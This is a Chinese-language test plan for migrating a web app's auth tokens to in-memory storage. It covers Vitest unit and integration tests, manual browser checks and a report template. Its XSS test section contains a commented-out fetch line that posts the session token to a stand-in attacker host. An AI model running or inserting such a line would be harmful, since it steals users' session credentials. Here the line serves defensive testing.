# Token 迁移测试详细流程

## 📋 测试概览

本文档提供了完整的测试流程,确保 Token 安全迁移工作正确实施。

## 🎯 测试目标

1. 验证 TokenService 核心功能正常工作
2. 确保所有认证流程正确集成
3. 验证安全性提升符合预期
4. 确保用户体验无负面影响

---

## 第一阶段: 单元测试

### 1.1 TokenService 基础功能测试

创建测试文件: `src/domains/shared/services/__tests__/TokenService.spec.ts`

```typescript
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { tokenService } from '../TokenService'

describe('TokenService', () => {
  beforeEach(() => {
    tokenService.clearToken()
    sessionStorage.clear()
    vi.useFakeTimers()
  })

  afterEach(() => {
    vi.restoreAllMocks()
  })

  describe('基础功能', () => {
    it('应该能存储和读取 access token', () => {
      const tokenData = {
        token: 'test-access-token',
        refreshToken: 'test-refresh-token',
      }

      tokenService.setToken(tokenData)

      expect(tokenService.getAccessToken()).toBe('test-access-token')
      expect(tokenService.getRefreshToken()).toBe('test-refresh-token')
    })

    it('应该能正确判断 token 有效性', () => {
      expect(tokenService.hasValidToken()).toBe(false)

      tokenService.setToken({
        token: 'test-token',
        expiresAt: Date.now() + 3600000,
      })

      expect(tokenService.hasValidToken()).toBe(true)
    })

    it('应该能清除 token', () => {
      tokenService.setToken({ token: 'test-token' })
      expect(tokenService.hasValidToken()).toBe(true)

      tokenService.clearToken()
      
      expect(tokenService.hasValidToken()).toBe(false)
      expect(tokenService.getAccessToken()).toBeNull()
    })
  })

  describe('过期处理', () => {
    it('应该自动清除已过期的 token', () => {
      tokenService.setToken({
        token: 'expired-token',
        expiresAt: Date.now() - 1000,
      })

      expect(tokenService.hasValidToken()).toBe(false)
      expect(tokenService.getAccessToken()).toBeNull()
    })

    it('应该能检测即将过期的 token', () => {
      tokenService.setToken({
        token: 'expiring-token',
        expiresAt: Date.now() + 4 * 60 * 1000,
      })

      expect(tokenService.isTokenExpiringSoon()).toBe(true)
    })
  })

  describe('SessionStorage 集成', () => {
    it('应该将 token 备份到 sessionStorage', () => {
      tokenService.setToken({
        token: 'test-token',
        refreshToken: 'test-refresh',
      })

      const stored = sessionStorage.getItem('auth_session')
      expect(stored).not.toBeNull()
      
      const parsed = JSON.parse(stored!)
      expect(parsed.token).toBe('test-token')
    })

    it('清除 token 时应该同时清除 sessionStorage', () => {
      tokenService.setToken({ token: 'test-token' })
      expect(sessionStorage.getItem('auth_session')).not.toBeNull()

      tokenService.clearToken()
      
      expect(sessionStorage.getItem('auth_session')).toBeNull()
    })
  })
})
```

**运行测试:**
```bash
npm run test:unit -- TokenService.spec.ts
```

### 1.2 Auth Store 测试

创建测试文件: `src/domains/auth/stores/__tests__/authStore.spec.ts`

```typescript
import { describe, it, expect, beforeEach, vi } from 'vitest'
import { setActivePinia, createPinia } from 'pinia'
import { useAuthStore } from '../authStore'
import { tokenService } from '@/domains/shared/services/TokenService'

vi.mock('../../services/authService', () => ({
  authService: {
    login: vi.fn(),
    refreshToken: vi.fn(),
    logout: vi.fn(),
  },
}))

describe('AuthStore', () => {
  beforeEach(() => {
    setActivePinia(createPinia())
    tokenService.clearToken()
  })

  describe('登录流程', () => {
    it('成功登录应该保存 token 和用户信息', async () => {
      const store = useAuthStore()
      const mockResponse = {
        user: { id: 1, account: 'testuser', permissions: [] },
        token: 'new-token',
        refreshToken: 'new-refresh',
        expiresAt: new Date(Date.now() + 3600000).toISOString(),
      }

      const { authService } = await import('../../services/authService')
      vi.mocked(authService.login).mockResolvedValue(mockResponse)

      await store.login({ account: 'testuser', password: 'password' })

      expect(store.isAuthenticated).toBe(true)
      expect(store.token).toBe('new-token')
      expect(tokenService.getAccessToken()).toBe('new-token')
    })
  })

  describe('登出流程', () => {
    it('应该清除所有认证状态', async () => {
      const store = useAuthStore()
      
      tokenService.setToken({ token: 'test-token' })
      store.isAuthenticated = true

      await store.logout()

      expect(store.isAuthenticated).toBe(false)
      expect(tokenService.getAccessToken()).toBeNull()
    })
  })
})
```

---

## 第二阶段: 集成测试

### 2.1 登录流程集成测试

创建测试文件: `src/tests/integration/auth-flow.spec.ts`

```typescript
import { describe, it, expect, beforeEach, vi } from 'vitest'
import { mount } from '@vue/test-utils'
import { createPinia, setActivePinia } from 'pinia'
import { createRouter, createMemoryHistory } from 'vue-router'
import { tokenService } from '@/domains/shared/services/TokenService'
import { useAuthStore } from '@/domains/auth/stores/authStore'
import LoginPage from '@/views/login.vue'

describe('认证流程集成测试', () => {
  let router: any
  
  beforeEach(async () => {
    setActivePinia(createPinia())
    tokenService.clearToken()
    sessionStorage.clear()
    
    // 创建测试路由
    router = createRouter({
      history: createMemoryHistory(),
      routes: [
        { path: '/login', component: LoginPage },
        { path: '/', component: { template: '<div>Home</div>' } },
      ],
    })
    
    await router.push('/login')
    await router.isReady()
  })

  it('完整登录流程', async () => {
    // Mock API 响应
    const mockLoginResponse = {
      user: { id: 1, account: 'testuser', permissions: ['read'] },
      token: 'test-access-token',
      refreshToken: 'test-refresh-token',
      expiresAt: new Date(Date.now() + 3600000).toISOString(),
    }
    
    vi.mock('@/domains/auth/services/authService', () => ({
      authService: {
        login: vi.fn().mockResolvedValue(mockLoginResponse),
      },
    }))

    const wrapper = mount(LoginPage, {
      global: {
        plugins: [createPinia(), router],
      },
    })

    // 1. 输入用户名和密码
    const accountInput = wrapper.find('input[name="account"]')
    const passwordInput = wrapper.find('input[name="password"]')
    
    await accountInput.setValue('testuser')
    await passwordInput.setValue('password123')

    // 2. 点击登录按钮
    const submitButton = wrapper.find('button[type="submit"]')
    await submitButton.trigger('click')
    await wrapper.vm.$nextTick()

    // 3. 等待异步操作完成
    await vi.waitFor(() => {
      expect(tokenService.hasValidToken()).toBe(true)
    })

    // 4. 验证 Token 已保存到内存
    expect(tokenService.getAccessToken()).toBe('test-access-token')
    expect(tokenService.getRefreshToken()).toBe('test-refresh-token')

    // 5. 验证 sessionStorage 有备份
    const session = sessionStorage.getItem('auth_session')
    expect(session).not.toBeNull()
    
    const sessionData = JSON.parse(session!)
    expect(sessionData.token).toBe('test-access-token')

    // 6. 验证 Store 状态
    const authStore = useAuthStore()
    expect(authStore.isAuthenticated).toBe(true)
    expect(authStore.user?.account).toBe('testuser')
  })
})
```

### 2.2 页面刷新状态恢复测试

```typescript
describe('页面刷新状态恢复', () => {
  it('应该从 sessionStorage 恢复认证状态', async () => {
    const authStore = useAuthStore()
    
    // 1. 模拟已登录状态
    const tokenData = {
      token: 'test-token',
      refreshToken: 'test-refresh',
      expiresAt: Date.now() + 3600000,
    }
    
    tokenService.setToken(tokenData)
    authStore.isAuthenticated = true
    
    // 2. 验证 sessionStorage 有数据
    const stored = sessionStorage.getItem('auth_session')
    expect(stored).not.toBeNull()

    // 3. 清除内存状态(模拟页面刷新)
    const storedData = JSON.parse(stored!)
    tokenService.clearToken()
    expect(tokenService.getAccessToken()).toBeNull()

    // 4. 重新初始化(模拟应用启动时的 initializeAuth)
    tokenService.setToken(storedData)

    // 5. 验证状态已恢复
    expect(tokenService.getAccessToken()).toBe('test-token')
    expect(tokenService.hasValidToken()).toBe(true)
  })

  it('过期 token 不应该被恢复', () => {
    // 设置已过期的 session
    const expiredSession = {
      token: 'expired-token',
      refreshToken: 'expired-refresh',
      expiresAt: Date.now() - 1000, // 已过期
    }
    
    sessionStorage.setItem('auth_session', JSON.stringify(expiredSession))

    // 尝试恢复
    const session = sessionStorage.getItem('auth_session')
    const sessionData = JSON.parse(session!)
    tokenService.setToken(sessionData)

    // 验证过期 token 被自动清除
    expect(tokenService.hasValidToken()).toBe(false)
    expect(tokenService.getAccessToken()).toBeNull()
  })
})
```

### 2.3 Token 过期自动刷新测试

```typescript
describe('Token 过期处理', () => {
  it('应该在 token 即将过期时触发刷新事件', async () => {
    vi.useFakeTimers()
    
    const refreshListener = vi.fn()
    window.addEventListener('token:refresh-needed', refreshListener)

    // 设置即将过期的 token (4分钟后过期)
    tokenService.setToken({
      token: 'expiring-token',
      refreshToken: 'refresh-token',
      expiresAt: Date.now() + 4 * 60 * 1000,
    })

    // 等待检查定时器触发 (TokenService 每60秒检查一次)
    await vi.advanceTimersByTimeAsync(61000)

    expect(refreshListener).toHaveBeenCalled()
    
    window.removeEventListener('token:refresh-needed', refreshListener)
    vi.useRealTimers()
  })

  it('应该能成功刷新 token', async () => {
    const authStore = useAuthStore()
    
    // 设置初始 token
    tokenService.setToken({
      token: 'old-token',
      refreshToken: 'refresh-token',
    })

    // Mock 刷新接口
    const mockRefreshResponse = {
      user: { id: 1, account: 'testuser', permissions: [] },
      token: 'new-token',
      refreshToken: 'new-refresh',
      expiresAt: new Date(Date.now() + 3600000).toISOString(),
    }
    
    const { authService } = await import('@/domains/auth/services/authService')
    vi.mocked(authService.refreshToken).mockResolvedValue(mockRefreshResponse)

    // 执行刷新
    await authStore.refreshAuthToken()

    // 验证新 token 已保存
    expect(tokenService.getAccessToken()).toBe('new-token')
    expect(tokenService.getRefreshToken()).toBe('new-refresh')
  })
})
```

### 2.4 HTTP 拦截器集成测试

```typescript
import { http } from '@/utils/http'

describe('HTTP 拦截器集成', () => {
  it('请求应该自动携带 Authorization 头', async () => {
    tokenService.setToken({ token: 'test-token' })

    // Mock fetch
    const mockFetch = vi.fn().mockResolvedValue({
      ok: true,
      json: async () => ({ data: 'success' }),
    })
    global.fetch = mockFetch

    // 发起请求
    await http.get('/api/test')

    // 验证请求头
    expect(mockFetch).toHaveBeenCalledWith(
      expect.any(String),
      expect.objectContaining({
        headers: expect.objectContaining({
          'Authorization': 'Bearer test-token',
        }),
      })
    )
  })

  it('401 错误应该清除 token 并跳转登录', async () => {
    const authStore = useAuthStore()
    tokenService.setToken({ token: 'invalid-token' })

    // Mock 401 响应
    global.fetch = vi.fn().mockResolvedValue({
      ok: false,
      status: 401,
      json: async () => ({ error: 'Unauthorized' }),
    })

    // 发起请求
    try {
      await http.get('/api/protected')
    } catch (error) {
      // 预期会抛出错误
    }

    // 验证 token 被清除
    expect(tokenService.getAccessToken()).toBeNull()
    expect(authStore.isAuthenticated).toBe(false)
  })
})
```

**运行集成测试:**
```bash
npm run test:integration
```

---

## 第三阶段: 手动测试

### 3.1 登录流程测试

**步骤:**

1. 打开登录页面 `http://localhost:5173/login`

2. 查看初始状态:
   ```javascript
   console.log('Token:', window.__tokenService?.getAccessToken())
   console.log('SessionStorage:', sessionStorage.getItem('auth_session'))
   ```

3. 执行登录:
   - 输入账号: `admin`
   - 输入密码: `admin123`
   - 点击登录

4. 验证登录成功:
   ```javascript
   console.log('Token:', window.__tokenService?.getAccessToken())
   console.log('SessionStorage:', sessionStorage.getItem('auth_session'))
   ```

**预期结果:**
- ✅ 登录成功后跳转到首页
- ✅ Token 存储在内存中
- ✅ SessionStorage 有备份
- ✅ API 请求自动携带 Authorization 头

### 3.2 页面刷新测试

**步骤:**

1. 确保已登录状态

2. 记录当前 Token:
   ```javascript
   const token = window.__tokenService?.getAccessToken()
   console.log('刷新前:', token)
   ```

3. 刷新页面 (F5)

4. 验证状态恢复:
   ```javascript
   const restored = window.__tokenService?.getAccessToken()
   console.log('刷新后:', restored)
   ```

**预期结果:**
- ✅ 页面刷新后保持登录状态
- ✅ Token 从 sessionStorage 正确恢复
- ✅ 用户信息显示正常

### 3.3 登出流程测试

**步骤:**

1. 查看当前状态:
   ```javascript
   console.log('登出前:', window.__tokenService?.getAccessToken())
   ```

2. 点击退出登录按钮

3. 验证状态清除:
   ```javascript
   console.log('登出后:', window.__tokenService?.getAccessToken())
   console.log('SessionStorage:', sessionStorage.getItem('auth_session'))
   ```

**预期结果:**
- ✅ Token 从内存清除
- ✅ SessionStorage 被清空
- ✅ 跳转到登录页

### 3.4 Token 过期测试

**方法 A: 修改过期时间**

临时修改 TokenService.ts:
```typescript
private readonly EXPIRY_THRESHOLD = 10 * 1000 // 改为10秒测试
```

登录后等待10秒,观察控制台日志。

**方法 B: 手动设置过期 Token**

```javascript
window.__tokenService?.setToken({
  token: 'test-token',
  expiresAt: Date.now() + 5000
})

setTimeout(() => {
  console.log('有效性:', window.__tokenService?.hasValidToken())
}, 6000)
```

**预期结果:**
- ✅ Token 过期前触发刷新事件
- ✅ 过期 Token 被自动清除

### 3.5 浏览器关闭测试

**步骤:**

1. 登录并确认 sessionStorage 有数据
2. 完全关闭浏览器(所有窗口)
3. 重新打开浏览器访问应用

**预期结果:**
- ✅ SessionStorage 被清空
- ✅ 需要重新登录
- ✅ 提高了安全性

### 3.6 API 请求测试

**步骤:**

1. 打开 Network 标签
2. 登录后发起任意 API 请求
3. 检查请求头是否包含 `Authorization: Bearer <token>`

4. 模拟 401 错误:
   ```javascript
   window.__tokenService?.clearToken()
   // 然后发起 API 请求
   ```

**预期结果:**
- ✅ 所有请求自动携带 Authorization 头
- ✅ 401 错误触发跳转登录或自动刷新

### 3.7 多标签页测试

**步骤:**

1. **标签页 A**: 打开应用并登录
2. **标签页 B**: 新开标签页访问应用
3. **标签页 A**: 执行登出
4. **标签页 B**: 刷新页面查看状态

**预期结果:**
- ⚠️ 标签页 B 需要重新登录 (sessionStorage 独立)
- ✅ 每个标签页有独立的会话
- ✅ 关闭标签页后 Token 自动清除

---

## 第四阶段: 性能与安全测试

### 4.1 性能测试

#### 4.1.1 响应时间测试

```javascript
console.time('setToken')
tokenService.setToken({ token: 'test', refreshToken: 'test' })
console.timeEnd('setToken')

console.time('getToken')
tokenService.getAccessToken()
console.timeEnd('getToken')

console.time('clearToken')
tokenService.clearToken()
console.timeEnd('clearToken')
```

**预期结果:**
- ✅ setToken < 1ms
- ✅ getToken < 0.1ms
- ✅ clearToken < 1ms

#### 4.1.2 内存占用测试

```javascript
// 在控制台执行
console.log('Initial memory:', performance.memory?.usedJSHeapSize)

// 执行多次登录登出
for (let i = 0; i < 100; i++) {
  tokenService.setToken({ token: `test-${i}`, refreshToken: `refresh-${i}` })
  tokenService.clearToken()
}

console.log('After operations:', performance.memory?.usedJSHeapSize)
```

**预期结果:**
- ✅ 内存占用稳定,无明显增长
- ✅ 无内存泄漏

### 4.2 安全测试

#### 4.2.1 XSS 防护测试

尝试通过控制台窃取 Token:

```javascript
// 尝试读取 localStorage (应该失败)
console.log(localStorage.getItem('token')) // null

// 尝试读取 sessionStorage (可能成功,但关闭标签页就清除)
console.log(sessionStorage.getItem('auth_session'))

// 尝试发送到恶意服务器(测试用例,不要在生产环境执行)
// fetch('https://evil.com/steal', {
//   method: 'POST',
//   body: sessionStorage.getItem('auth_session')
// })
```

**预期结果:**
- ✅ Token 主要存储在内存中,难以被 XSS 窃取
- ✅ SessionStorage 仅用于会话恢复
- ✅ 关闭标签页自动清除,降低风险

#### 4.2.2 Token 篡改测试

```javascript
// 尝试修改 token
sessionStorage.setItem('auth_session', JSON.stringify({
  token: 'fake-token',
  refreshToken: 'fake-refresh'
}))

// 刷新页面
location.reload()

// 发起 API 请求
// 预期: 服务器返回 401,前端跳转登录
```

**预期结果:**
- ✅ 伪造的 token 无法通过服务器验证
- ✅ 401 错误触发 token 清除和登录跳转

#### 4.2.3 CSRF 防护验证

```javascript
// 验证 Token 不存储在 Cookie 中
console.log('Cookies:', document.cookie)
// 预期: 不包含 token 相关 cookie

// 验证 sessionStorage 的同源策略
// 跨域网站无法读取 sessionStorage
```

**预期结果:**
- ✅ Token 不在 Cookie 中,防止 CSRF 攻击
- ✅ SessionStorage 受同源策略保护

---

## 测试报告模板

```markdown
## Token 迁移测试报告

### 测试信息
- 测试人员: [姓名]
- 测试时间: [日期]
- 测试环境: [开发/测试/生产]
- 浏览器版本: [Chrome 120 / Firefox 121 / Safari 17]

### 测试结果

| 阶段 | 测试类型 | 测试项 | 状态 | 备注 |
|------|---------|--------|------|------|
| 一 | 单元测试 | TokenService 基础功能 | ✅ | - |
| 一 | 单元测试 | TokenService 过期处理 | ✅ | - |
| 一 | 单元测试 | AuthStore 集成 | ✅ | - |
| 二 | 集成测试 | 登录流程 | ✅ | - |
| 二 | 集成测试 | 页面刷新恢复 | ✅ | - |
| 二 | 集成测试 | Token 自动刷新 | ✅ | - |
| 二 | 集成测试 | HTTP 拦截器 | ✅ | - |
| 三 | 手动测试 | 登录功能 | ✅ | - |
| 三 | 手动测试 | 登出功能 | ✅ | - |
| 三 | 手动测试 | 页面刷新 | ✅ | - |
| 三 | 手动测试 | Token 过期 | ✅ | - |
| 三 | 手动测试 | 浏览器关闭 | ✅ | - |
| 三 | 手动测试 | API 请求 | ✅ | - |
| 三 | 手动测试 | 多标签页 | ⚠️ | 各标签页独立 |
| 四 | 性能测试 | 响应时间 | ✅ | < 1ms |
| 四 | 性能测试 | 内存占用 | ✅ | 无泄漏 |
| 四 | 安全测试 | XSS 防护 | ✅ | - |
| 四 | 安全测试 | Token 篡改 | ✅ | - |
| 四 | 安全测试 | CSRF 防护 | ✅ | - |

### 发现的问题

无

### 总结

Token 迁移测试全部通过,所有四个阶段测试完成:
1. ✅ 单元测试 - 核心功能验证
2. ✅ 集成测试 - 模块协作验证  
3. ✅ 手动测试 - 用户体验验证
4. ✅ 性能与安全测试 - 非功能性验证

建议发布到生产环境。
```

---

## 运行所有测试

```bash
# 1. 运行单元测试
npm run test:unit

# 2. 运行集成测试  
npm run test:integration

# 3. 启动开发服务器进行手动测试
npm run dev

# 4. 运行所有自动化测试
npm run test
```

## 完整检查清单

### 第一阶段: 单元测试
- [ ] TokenService 基础功能测试通过
- [ ] TokenService 过期处理测试通过
- [ ] TokenService SessionStorage 测试通过
- [ ] AuthStore 登录流程测试通过
- [ ] AuthStore 登出流程测试通过

### 第二阶段: 集成测试
- [ ] 完整登录流程集成测试通过
- [ ] 页面刷新状态恢复测试通过
- [ ] Token 过期自动刷新测试通过
- [ ] HTTP 拦截器集成测试通过

### 第三阶段: 手动测试
- [ ] 登录流程正常
- [ ] 登出流程正常
- [ ] 页面刷新状态恢复正常
- [ ] Token 过期处理正确
- [ ] 浏览器关闭后清除
- [ ] API 请求携带 Token
- [ ] 多标签页行为符合预期

### 第四阶段: 性能与安全测试
- [ ] 响应时间符合预期
- [ ] 内存占用正常
- [ ] XSS 防护有效
- [ ] Token 篡改保护有效
- [ ] CSRF 防护有效

---

## 注意事项

1. **测试顺序**: 建议按阶段顺序执行,先通过单元测试再进行集成测试
2. **环境隔离**: 每次测试前清理 token 和 sessionStorage
3. **异步处理**: 注意等待异步操作完成再验证结果
4. **浏览器兼容**: 在主流浏览器(Chrome, Firefox, Safari)上都要测试
5. **生产验证**: 在生产环境发布前,在类生产环境再次验证核心流程